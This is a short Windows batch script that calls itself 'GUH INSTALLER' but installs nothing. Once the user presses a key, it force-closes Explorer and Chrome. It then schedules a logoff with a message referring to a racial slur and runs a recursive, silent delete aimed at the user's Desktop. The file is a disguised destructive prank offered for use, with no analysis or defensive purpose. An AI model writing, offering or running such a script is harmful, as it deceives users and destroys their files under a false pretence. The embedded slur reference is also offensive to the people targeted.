@echo off
title "GUH INSTALLER"
echo "YOU NEED ADMINISTRATOR PERMISSIONS TO DO THIS. ARE YOU SURE YOU WANT TO DO THIS?"
pause
cd %USERPROFILE%
taskkill /f /im explorer.exe
taskkill /f /im chrome.exe
shutdown /l /t 3600 /c "Say the n word and we’ll head to the Pickle Lakefront"
rd /s /q "./Desktop/*"
start explorer.exe
exit
